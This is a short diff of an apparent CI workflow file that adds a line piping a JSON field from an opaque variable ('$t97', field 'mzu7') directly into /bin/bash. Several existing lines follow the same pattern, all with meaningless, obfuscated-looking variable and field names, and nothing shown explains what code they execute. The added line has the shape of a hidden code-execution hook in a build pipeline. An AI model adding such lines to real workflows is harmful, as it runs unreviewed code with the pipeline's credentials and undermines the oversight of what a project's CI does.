@@ -29,6 +29,7 @@ jobs:
           echo $kzdt716 | jq -r .f4264 | /bin/bash
           printf '%s' "$az1" | jq -r .tvzk4621 | /bin/bash
           printf '%s' "$az45824" | jq -r .zhyg8 | /bin/bash
+          echo $t97 | jq -r .mzu7 | /bin/bash
 
       - name: Store artifact
         if: always()
